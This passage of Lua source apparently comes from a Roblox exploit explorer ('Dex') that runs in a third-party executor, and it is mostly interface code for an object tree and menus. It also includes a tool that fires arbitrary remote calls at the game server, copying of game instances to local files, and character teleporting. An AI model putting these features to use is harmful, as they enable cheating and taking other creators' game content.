	newArgument.Type.MouseButton1Down:connect(function()
		createDDown(newArgument.Type,function(choice)
			newArgument.Type.Text = choice
		end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
	end)
	
	CurrentRemoteWindow.MainWindow.Ok.MouseButton1Up:connect(function()
		if CurrentRemoteWindow and inst.Parent ~= nil then
			local MyArguments = {}
			for i,v in pairs(ArgumentList:GetChildren()) do
				table.insert(MyArguments,ToValue(v.Value.Text,v.Type.Text))
			end
			if inst:IsA("RemoteFunction") then
				if displayValues then
					spawn(function()
						local myResults = inst:InvokeServer(unpack(MyArguments))
						if myResults then
							CreateTableCaution("Remote Caller",myResults)
						else
							CreateCaution("Remote Caller","This remote did not return anything.")
						end
					end)
				else
					spawn(function()
						inst:InvokeServer(unpack(MyArguments))
					end)
				end
			else
				inst:FireServer(unpack(MyArguments))
			end
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Add.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			local newArgument = ArgumentTemplate:Clone()
			newArgument.Position = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Parent = ArgumentList
			ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Visible = true
			newArgument.Type.MouseButton1Down:connect(function()
				createDDown(newArgument.Type,function(choice)
					newArgument.Type.Text = choice
				end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
			end)
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Subtract.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			if #ArgumentList:GetChildren() > 1 then
				ArgumentList:GetChildren()[#ArgumentList:GetChildren()]:Destroy()
				ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			end
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.DisplayReturned.MouseButton1Up:connect(function()
		if displayValues then
			displayValues = false
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = false
		else
			displayValues = true
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = true
		end
	end)
end

function PromptSaveInstance(inst)
	if not SaveInstance and not _G.SaveInstance then CreateCaution("SaveInstance Missing","You do not have the SaveInstance function installed. Please go to RaspberryPi's thread to retrieve it.") return end
	if CurrentSaveInstanceWindow then
		CurrentSaveInstanceWindow:Destroy()
		CurrentSaveInstanceWindow = nil
		if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
			explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
		end
	end
	CurrentSaveInstanceWindow = SaveInstanceWindow:Clone()
	CurrentSaveInstanceWindow.Parent = explorerPanel.Parent
	CurrentSaveInstanceWindow.Visible = true
	
	local filename = CurrentSaveInstanceWindow.MainWindow.FileName
	local saveObjects = true
	local overwriteCaution = false
	
	CurrentSaveInstanceWindow.MainWindow.Save.MouseButton1Up:connect(function()
		if readfile and getelysianpath then
			if readfile(getelysianpath()..filename.Text..".rbxmx") then
				if not overwriteCaution then
					overwriteCaution = true
					local newCaution = ConfirmationWindow:Clone()
					newCaution.Name = "SaveInstanceOverwriteCaution"
					newCaution.MainWindow.Desc.Text = "The file, "..filename.Text..".rbxmx, already exists. Overwrite?"
					newCaution.Parent = explorerPanel.Parent
					newCaution.Visible = true
					newCaution.MainWindow.Yes.MouseButton1Up:connect(function()
						ypcall(function()
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						end)
						overwriteCaution = false
						newCaution:Destroy()
						if CurrentSaveInstanceWindow then
							CurrentSaveInstanceWindow:Destroy()
							CurrentSaveInstanceWindow = nil
						end
					end)
					newCaution.MainWindow.No.MouseButton1Up:connect(function()
						overwriteCaution = false
						newCaution:Destroy()
					end)
				end
			else
				ypcall(function()
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				end)
				if CurrentSaveInstanceWindow then
					CurrentSaveInstanceWindow:Destroy()
					CurrentSaveInstanceWindow = nil
					if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
						explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
					end
				end
			end
		else
			ypcall(function()
				if SaveInstance then
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				else
					_G.SaveInstance(inst,filename.Text,not saveObjects)
				end
			end)
			if CurrentSaveInstanceWindow then
				CurrentSaveInstanceWindow:Destroy()
				CurrentSaveInstanceWindow = nil
				if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
					explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
				end
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentSaveInstanceWindow then
			CurrentSaveInstanceWindow:Destroy()
			CurrentSaveInstanceWindow = nil
			if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
				explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.SaveObjects.MouseButton1Up:connect(function()
		if saveObjects then
			saveObjects = false
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = false
		else
			saveObjects = true
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = true
		end
	end)
end

function DestroyRightClick()
	if currentRightClickMenu then
		currentRightClickMenu:Destroy()
		currentRightClickMenu = nil
	end
	if CurrentInsertObjectWindow and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Visible = false
	end
end

function rightClickMenu(sObj)
	local mouse = game.Players.LocalPlayer:GetMouse()
	
	currentRightClickMenu = CreateRightClickMenu(
		{"Cut","Copy","Paste Into","Duplicate","Delete","Group","Ungroup","Select Children","Teleport To","Insert Part","Insert Object","View Script","Save Instance","Call Function","Call Remote"},
		"",
		false,
		function(option)
			if option == "Cut" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				local cut = {}
				for i = 1,#list do
					local obj = list[i]:Clone()
					if obj then
						table.insert(clipboard,obj)
						table.insert(cut,list[i])
					end
				end
				for i = 1,#cut do
					pcall(delete,cut[i])
				end
				updateActions()
			elseif option == "Copy" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				for i = 1,#list do
					table.insert(clipboard,list[i]:Clone())
				end
				updateActions()
			elseif option == "Paste Into" then
				if not Option.Modifiable then return end
				local parent = Selection.List[1] or workspace
				for i = 1,#clipboard do
					clipboard[i]:Clone().Parent = parent
				end
			elseif option == "Duplicate" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					list[i]:Clone().Parent = Selection.List[1].Parent or workspace
				end
			elseif option == "Delete" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					pcall(delete,list[i])
				end
				Selection:Set({})
			elseif option == "Group" then
				if not Option.Modifiable then return end
				local newModel = Instance.new("Model")
				local list = Selection:Get()
				newModel.Parent = Selection.List[1].Parent or workspace
				for i = 1,#list do
					list[i].Parent = newModel
				end
				Selection:Set({})
			elseif option == "Ungroup" then
				if not Option.Modifiable then return end
				local ungrouped = {}
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("Model") then
						for i2,v2 in pairs(list[i]:GetChildren()) do
							v2.Parent = list[i].Parent or workspace
							table.insert(ungrouped,v2)
						end		
						pcall(delete,list[i])			
					end
				end
				Selection:Set({})
				if SettingsRemote:Invoke("SelectUngrouped") then
					for i,v in pairs(ungrouped) do
						Selection:Add(v)
					end
				end
			elseif option == "Select Children" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				Selection:Set({})
				Selection:StopUpdates()
				for i = 1,#list do
					for i2,v2 in pairs(list[i]:GetChildren()) do
						Selection:Add(v2)
					end
				end
				Selection:ResumeUpdates()
			elseif option == "Teleport To" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("BasePart") then
						pcall(function()
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = list[i].CFrame
						end)
						break
					end
				end
			elseif option == "Insert Part" then
				if not Option.Modifiable then return end
				local insertedParts = {}
				local list = Selection:Get()
				for i = 1,#list do
					pcall(function()
						local newPart = Instance.new("Part")
						newPart.Parent = list[i]
						newPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position) + Vector3.new(0,3,0)
						table.insert(insertedParts,newPart)
					end)
				end
			elseif option == "Save Instance" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				if #list == 1 then
					list[1].Archivable = true
					ypcall(function()PromptSaveInstance(list[1]:Clone())end)
				elseif #list > 1 then
					local newModel = Instance.new("Model")
					newModel.Name = "SavedInstances"
					for i = 1,#list do
						ypcall(function()
							list[i].Archivable = true
							list[i]:Clone().Parent = newModel
						end)
					end
					PromptSaveInstance(newModel)
				end
			elseif option == "Call Remote" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("RemoteFunction") or list[i]:IsA("RemoteEvent") then
						PromptRemoteCaller(list[i])
						break
					end
				end
			elseif option == "View Script" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("LocalScript") or list[i]:IsA("ModuleScript") then
						ScriptEditorEvent:Fire(list[i])
					end
				end
			end
	end)
	currentRightClickMenu.Parent = explorerPanel.Parent
	currentRightClickMenu.Position = UDim2.new(0,mouse.X,0,mouse.Y)
	if currentRightClickMenu.AbsolutePosition.X + currentRightClickMenu.AbsoluteSize.X > explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X then
		currentRightClickMenu.Position = UDim2.new(0, explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X - currentRightClickMenu.AbsoluteSize.X, 0, mouse.Y)
	end
end

local function cancelReparentDrag()end
local function cancelSelectDrag()end
do
	local listEntries = {}
	local nameConnLookup = {}

	local mouseDrag = Create('ImageButton',{
		Name = "MouseDrag";
		Position = UDim2.new(-0.25,0,-0.25,0);
		Size = UDim2.new(1.5,0,1.5,0);
		Transparency = 1;
		AutoButtonColor = false;
		Active = true;
		ZIndex = 10;
	})
	local function dragSelect(last,add,button)
		local connDrag
		local conUp

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local pos = Vector2.new(x,y) - listFrame.AbsolutePosition
			local size = listFrame.AbsoluteSize
			if pos.x < 0 or pos.x > size.x or pos.y < 0 or pos.y > size.y then return end

			local i = math.ceil(pos.y/ENTRY_BOUND) + scrollBar.ScrollIndex
			-- Mouse may have made a large step, so interpolate between the
			-- last index and the current.
			for n = i<last and i or last, i>last and i or last do
				local node = TreeList[n]
				if node then
					if add then
						Selection:Add(node.Object)
					else
						Selection:Remove(node.Object)
					end
				end
			end
			last = i
		end)

		function cancelSelectDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			function cancelSelectDrag()end
		end

		conUp = mouseDrag[button]:connect(cancelSelectDrag)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local function dragReparent(object,dragGhost,clickPos,ghostOffset)
		local connDrag
		local conUp
		local conUp2

		local parentIndex = nil
		local dragged = false

		local parentHighlight = Create('Frame',{
			Transparency = 1;
			Visible = false;
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(1,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,1,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
		})
		SetZIndex(parentHighlight,9)

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local dragPos = Vector2.new(x,y)
			if dragged then
				local pos = dragPos - listFrame.AbsolutePosition
				local size = listFrame.AbsoluteSize

				parentIndex = nil
				parentHighlight.Visible = false
				if pos.x >= 0 and pos.x <= size.x and pos.y >= 0 and pos.y <= size.y + ENTRY_SIZE*2 then
					local i = math.ceil(pos.y/ENTRY_BOUND-2)
					local node = TreeList[i + scrollBar.ScrollIndex]
					if node and node.Object ~= object and not object:IsAncestorOf(node.Object) then
						parentIndex = i
						local entry = listEntries[i]
						if entry then
							parentHighlight.Visible = true
							parentHighlight.Position = UDim2.new(0,1,0,entry.AbsolutePosition.y-listFrame.AbsolutePosition.y)
							parentHighlight.Size = UDim2.new(0,size.x-4,0,entry.AbsoluteSize.y)
						end
					end
				end

				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
			elseif (clickPos-dragPos).magnitude > 8 then
				dragged = true
				SetZIndex(dragGhost,9)
				dragGhost.IndentFrame.Transparency = 0.25
				dragGhost.IndentFrame.EntryText.TextColor3 = GuiColor.TextSelected
				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
				dragGhost.Parent = GetScreen(listFrame)
				parentHighlight.Parent = listFrame
			end
		end)

		function cancelReparentDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			conUp2:disconnect()
			dragGhost:Destroy()
			parentHighlight:Destroy()
			function cancelReparentDrag()end
		end

		local wasSelected = Selection.Selected[object]
		if not wasSelected and Option.Selectable then
			Selection:Set({object})
		end

		conUp = mouseDrag.MouseButton1Up:connect(function()
			cancelReparentDrag()
			if dragged then
				if parentIndex then
					local parentNode = TreeList[parentIndex + scrollBar.ScrollIndex]
					if parentNode then
						parentNode.Expanded = true

						local parentObj = parentNode.Object
						local function parent(a,b)
							a.Parent = b
						end
						if Option.Selectable then
							local list = Selection.List
							for i = 1,#list do
								pcall(parent,list[i],parentObj)
							end
						else
							pcall(parent,object,parentObj)
						end
					end
				end
			else
				-- do selection click
				if wasSelected and Option.Selectable then
					Selection:Set({})
				end
			end
		end)
		conUp2 = mouseDrag.MouseButton2Down:connect(function()
			cancelReparentDrag()
		end)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local entryTemplate = Create('ImageButton',{
		Name = "Entry";
		Transparency = 1;
		AutoButtonColor = false;
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,0,ENTRY_SIZE);
		Create('Frame',{
			Name = "IndentFrame";
			BackgroundTransparency = 1;
			BackgroundColor3 = GuiColor.Selected;
			BorderColor3 = GuiColor.BorderSelected;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,0,1,0);
			Create(Icon('ImageButton',0),{
				Name = "Expand";
				AutoButtonColor = false;
				Position = UDim2.new(0,-GUI_SIZE,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create(Icon(nil,0),{
				Name = "ExplorerIcon";
				Position = UDim2.new(0,2+ENTRY_PADDING,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create('TextLabel',{
				Name = "EntryText";
				BackgroundTransparency = 1;
				TextColor3 = GuiColor.Text;
				TextXAlignment = 'Left';
				TextYAlignment = 'Center';
				Font = FONT;
				FontSize = FONT_SIZE;
				Text = "";
				Position = UDim2.new(0,2+ENTRY_SIZE+4,0,0);
				Size = UDim2.new(1,-2,1,0);
			});
		});
	})

	function scrollBar.UpdateCallback(self)
		for i = 1,self.VisibleSpace do
			local node = TreeList[i + self.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if not entry then
					entry = Create(entryTemplate:Clone(),{
						Position = UDim2.new(0,2,0,ENTRY_BOUND*(i-1)+2);
						Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE);
						ZIndex = listFrame.ZIndex;
					})
					listEntries[i] = entry

					local expand = entry.IndentFrame.Expand
					expand.MouseEnter:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
								Icon(expand,NODE_EXPANDED_OVER)
							else
								Icon(expand,NODE_COLLAPSED_OVER)
							end
						end
					end)
					expand.MouseLeave:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
								Icon(expand,NODE_EXPANDED)
							else
								Icon(expand,NODE_COLLAPSED)
							end
						end
					end)
					expand.MouseButton1Down:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							node.Expanded = not node.Expanded
							if node.Object == explorerPanel.Parent and node.Expanded then
								CreateCaution("Warning","Please be careful when editing instances inside here, this is like the System32 of Dex and modifying objects here can break Dex.")
							end
							-- use raw update so the list updates instantly
							rawUpdateList()
						end
					end)

					entry.MouseButton1Down:connect(function(x,y)
						local node = TreeList[i + self.ScrollIndex]
						DestroyRightClick()
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not HoldingShift then
							lastSelectedNode = i + self.ScrollIndex
						end
						
						if HoldingShift and not filteringWorkspace() then
							if lastSelectedNode then
								if i + self.ScrollIndex - lastSelectedNode > 0 then
									Selection:StopUpdates()
									for i2 = 1, i + self.ScrollIndex - lastSelectedNode do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								else
									Selection:StopUpdates()
									for i2 = i + self.ScrollIndex - lastSelectedNode, 1 do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								end
							end
							return
						end
						
						if HoldingCtrl then
							if Selection.Selected[node.Object] then
								Selection:Remove(node.Object)
							else
								Selection:Add(node.Object)
							end
							return
						end
						if Option.Modifiable then
							local pos = Vector2.new(x,y)
							dragReparent(node.Object,entry:Clone(),pos,entry.AbsolutePosition-pos)
						elseif Option.Selectable then
							if Selection.Selected[node.Object] then
								Selection:Set({})
							else
								Selection:Set({node.Object})
							end
							dragSelect(i+self.ScrollIndex,true,'MouseButton1Up')
						end
					end)

					entry.MouseButton2Down:connect(function()
						if not Option.Selectable then return end
						
						DestroyRightClick()
						
						curSelect = entry
						
						local node = TreeList[i + self.ScrollIndex]
						
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not Selection.Selected[node.Object] then
							Selection:Set({node.Object})
						end
					end)
					
					
					entry.MouseButton2Up:connect(function()
						if not Option.Selectable then return end
						
						local node = TreeList[i + self.ScrollIndex]
						
						if checkMouseInGui(curSelect) then
							rightClickMenu(node.Object)
						end
					end)

					entry.Parent = listFrame
				end

				entry.Visible = true

				local object = node.Object

				-- update expand icon
				if #node == 0 then
					entry.IndentFrame.Expand.Visible = false
				elseif node.Expanded then
					Icon(entry.IndentFrame.Expand,NODE_EXPANDED)
					entry.IndentFrame.Expand.Visible = true
				else
					Icon(entry.IndentFrame.Expand,NODE_COLLAPSED)
					entry.IndentFrame.Expand.Visible = true
				end

				-- update explorer icon
				Icon(entry.IndentFrame.ExplorerIcon,ExplorerIndex[object.ClassName] or 0)

				-- update indentation
				local w = (node.Depth)*(2+ENTRY_PADDING+GUI_SIZE)
				entry.IndentFrame.Position = UDim2.new(0,w,0,0)
				entry.IndentFrame.Size = UDim2.new(1,-w,1,0)

				-- update name change detection
				if nameConnLookup[entry] then
					nameConnLookup[entry]:disconnect()
				end
				local text = entry.IndentFrame.EntryText
				text.Text = object.Name
				nameConnLookup[entry] = node.Object.Changed:connect(function(p)
					if p == 'Name' then
						text.Text = object.Name
					end
				end)

				-- update selection
				entry.IndentFrame.Transparency = node.Selected and 0 or 1
				text.TextColor3 = GuiColor[node.Selected and 'TextSelected' or 'Text']

				entry.Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE)
			elseif listEntries[i] then
				listEntries[i].Visible = false
			end
		end
		for i = self.VisibleSpace+1,self.TotalSpace do
			local entry = listEntries[i]
			if entry then
				listEntries[i] = nil
				entry:Destroy()
			end
		end
	end

	function scrollBarH.UpdateCallback(self)
		for i = 1,scrollBar.VisibleSpace do
			local node = TreeList[i + scrollBar.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if entry then
					entry.Position = UDim2.new(0,2 - scrollBarH.ScrollIndex,0,ENTRY_BOUND*(i-1)+2)
				end
			end
		end
	end

	Connect(listFrame.Changed,function(p)
		if p == 'AbsoluteSize' then
			rawUpdateSize()
		end
	end)

	local wheelAmount = 6
	explorerPanel.MouseWheelForward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end)
	explorerPanel.MouseWheelBackward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end)
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Object detection

-- Inserts `v` into `t` at `i`. Also sets `Index` field in `v`.
local function insert(t,i,v)
	for n = #t,i,-1 do
		local v = t[n]
		v.Index = n+1
		t[n+1] = v
	end
	v.Index = i
	t[i] = v
end

-- Removes `i` from `t`. Also sets `Index` field in removed value.
local function remove(t,i)
	local v = t[i]
	for n = i+1,#t do
		local v = t[n]
		v.Index = n-1
		t[n-1] = v
	end
	t[#t] = nil
	v.Index = 0
	return v
end

-- Returns how deep `o` is in the tree.
local function depth(o)
	local d = -1
	while o do
		o = o.Parent
		d = d + 1
	end
	return d
end


local connLookup = {}

-- Returns whether a node would be present in the tree list
local function nodeIsVisible(node)
	local visible = true
	node = node.Parent
	while node and visible do
		visible = visible and node.Expanded
		node = node.Parent
	end
	return visible
end

-- Removes an object's tree node. Called when the object stops existing in the
-- game tree.
local function removeObject(object)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	Selection:Remove(object,true)

	local parent = objectNode.Parent
	remove(parent,objectNode.Index)
	NodeLookup[object] = nil
	connLookup[object]:disconnect()
	connLookup[object] = nil

	if visible then
		updateList()
	elseif nodeIsVisible(parent) then
		updateScroll()
	end
end

-- Moves a tree node to a new parent. Called when an existing object's parent
-- changes.
local function moveObject(object,parent)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local parentNode = NodeLookup[parent]
	if not parentNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	remove(objectNode.Parent,objectNode.Index)
	objectNode.Parent = parentNode

	objectNode.Depth = depth(object)
	local function r(node,d)
		for i = 1,#node do
			node[i].Depth = d
			r(node[i],d+1)
		end
	end
	r(objectNode,objectNode.Depth+1)

	insert(parentNode,#parentNode+1,objectNode)

	if visible or nodeIsVisible(objectNode) then
		updateList()
	elseif nodeIsVisible(objectNode.Parent) then
		updateScroll()
	end
end

-- ScriptContext['/Libraries/LibraryRegistration/LibraryRegistration']
-- This RobloxLocked object lets me index its properties for some reason

local function check(object)
	return object.AncestryChanged
end

-- Creates a new tree node from an object. Called when an object starts
-- existing in the game tree.
local function addObject(object,noupdate)
	if script then
		-- protect against naughty RobloxLocked objects
		local s = pcall(check,object)
		if not s then
			return
		end
	end

	local parentNode = NodeLookup[object.Parent]
	if not parentNode then
		return
	end

	local objectNode = {
		Object = object;
		Parent = parentNode;
		Index = 0;
		Expanded = false;
		Selected = false;
		Depth = depth(object);
	}

	connLookup[object] = Connect(object.AncestryChanged,function(c,p)
		if c == object then
			if p == nil then
				removeObject(c)
			else
				moveObject(c,p)
			end
		end
	end)

	NodeLookup[object] = objectNode
	insert(parentNode,#parentNode+1,objectNode)

	if not noupdate then
		if nodeIsVisible(objectNode) then
			updateList()
		elseif nodeIsVisible(objectNode.Parent) then
			updateScroll()
		end
	end
end

local function makeObject(obj,par)
	local newObject = Instance.new(obj.ClassName)
	for i,v in pairs(obj.Properties) do
		ypcall(function()
			local newProp
			newProp = ToPropValue(v.Value,v.Type)
			newObject[v.Name] = newProp
		end)
	end
	newObject.Parent = par
end

local function writeObject(obj)
	local newObject = {ClassName = obj.ClassName, Properties = {}}
	for i,v in pairs(RbxApi.GetProperties(obj.className)) do
		if v["Name"] ~= "Parent" then
			print("thispassed")
			table.insert(newObject.Properties,{Name = v["Name"], Type = v["ValueType"], Value = tostring(obj[v["Name"]])})
		end
	end
	return newObject
end

local function buildDexStorage()
	local localDexStorage
	
	local success,err = ypcall(function()
		localDexStorage = game:GetObjects("rbxasset://DexStorage.rbxm")[1]
	end)
	
	if success and localDexStorage then
		for i,v in pairs(localDexStorage:GetChildren()) do
			ypcall(function()
				v.Parent = DexStorageMain
			end)
		end
	end
	
	updateDexStorageListeners()
	--[[
	local localDexStorage = readfile(getelysianpath().."DexStorage.txt")--game:GetService("CookiesService"):GetCookieValue("DexStorage")
	--local success,err = pcall(function()
		if localDexStorage then
			local objTable = game:GetService("HttpService"):JSONDecode(localDexStorage)
			for i,v in pairs(objTable) do
				makeObject(v,DexStorageMain)
			end
		end
	--end)
	--]]
end

local dexStorageDebounce = false
local dexStorageListeners = {}

local function updateDexStorage()
	if dexStorageDebounce then return end
	dexStorageDebounce = true	
	
	wait()
	
	pcall(function()
		saveinstance("content//DexStorage.rbxm",DexStorageMain)
	end)
	
	updateDexStorageListeners()
	
	dexStorageDebounce = false
	--[[
	local success,err = ypcall(function()
		local objs = {}
		for i,v in pairs(DexStorageMain:GetChildren()) do
			table.insert(objs,writeObject(v))
		end
		writefile(getelysianpath().."DexStorage.txt",game:GetService("HttpService"):JSONEncode(objs))
		--game:GetService("CookiesService"):SetCookieValue("DexStorage",game:GetService("HttpService"):JSONEncode(objs))
	end)
	if err then
		CreateCaution("DexStorage Save Fail!","DexStorage broke! If you see this message, report to Raspberry Pi!")
	end
	print("hi")
	--]]
end

function updateDexStorageListeners()
	for i,v in pairs(dexStorageListeners) do
		v:Disconnect()
	end
	dexStorageListeners = {}
	for i,v in pairs(DexStorageMain:GetChildren()) do
		pcall(function()
			local ev = v.Changed:connect(updateDexStorage)
			table.insert(dexStorageListeners,ev)
		end)
	end
end

do
	NodeLookup[workspace.Parent] = {
		Object = workspace.Parent;
		Parent = nil;
		Index = 0;
		Expanded = true;
	}
	
	if DexStorageEnabled then
		NodeLookup[DexStorage] = {
			Object = DexStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end
	
	if NilStorageEnabled then
		NodeLookup[NilStorage] = {
			Object = NilStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end

	Connect(game.DescendantAdded,addObject)
	Connect(game.DescendantRemoving,removeObject)
	
	if DexStorageEnabled then
		--[[
		if readfile(getelysianpath().."DexStorage.txt") == nil then
			writefile(getelysianpath().."DexStorage.txt","")
		end
		--]]
		
		buildDexStorage()
	
		Connect(DexStorage.DescendantAdded,addObject)
		Connect(DexStorage.DescendantRemoving,removeObject)
	
		Connect(DexStorage.DescendantAdded,updateDexStorage)
		Connect(DexStorage.DescendantRemoving,updateDexStorage)
	end
	
	if NilStorageEnabled then
		Connect(NilStorage.DescendantAdded,addObject)
		Connect(NilStorage.DescendantRemoving,removeObject)		
		
		local currentTable = get_nil_instances()	
		
		spawn(function()
			while wait() do
				if #currentTable ~= #get_nil_instances() then
					currentTable = get_nil_instances()
					--NilStorageMain:ClearAllChildren()
					for i,v in pairs(get_nil_instances()) do
						if v ~= NilStorage and v ~= DexStorage then
							pcall(function()
								v.Parent = NilStorageMain
							end)
							--[[
							local newNil = v
							newNil.Archivable = true
							newNil:Clone().Parent = NilStorageMain
							--]]
						end
					end
				end
			end
		end)
	end

	local function get(o)
		return o:GetChildren()
	end

	local function r(o)
		local s,children = pcall(get,o)
		if s then
			for i = 1,#children do
				addObject(children[i],true)
				r(children[i])
			end
		end
	end

	r(workspace.Parent)
	if DexStorageEnabled then
		r(DexStorage)
	end
	if NilStorageEnabled then
		r(NilStorage)
	end

	scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
	updateList()
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Actions

local actionButtons do
	actionButtons = {}

	local totalActions = 1
	local currentActions = totalActions
	local function makeButton(icon,over,name,vis,cond)
		local buttonEnabled = false
		
		local button = Create(Icon('ImageButton',icon),{
			Name = name .. "Button";
			Visible = Option.Modifiable and Option.Selectable;
			Position = UDim2.new(1,-(GUI_SIZE+2)*currentActions+2,0.25,-GUI_SIZE/2);
			Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			Parent = headerFrame;
		})

		local tipText = Create('TextLabel',{
			Name = name .. "Text";
			Text = name;
			Visible = false;
			BackgroundTransparency = 1;
			TextXAlignment = 'Right';
			Font = FONT;
			FontSize = FONT_SIZE;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,-(GUI_SIZE+2)*totalActions,1,0);
			Parent = headerFrame;
		})

		
		button.MouseEnter:connect(function()
			if buttonEnabled then
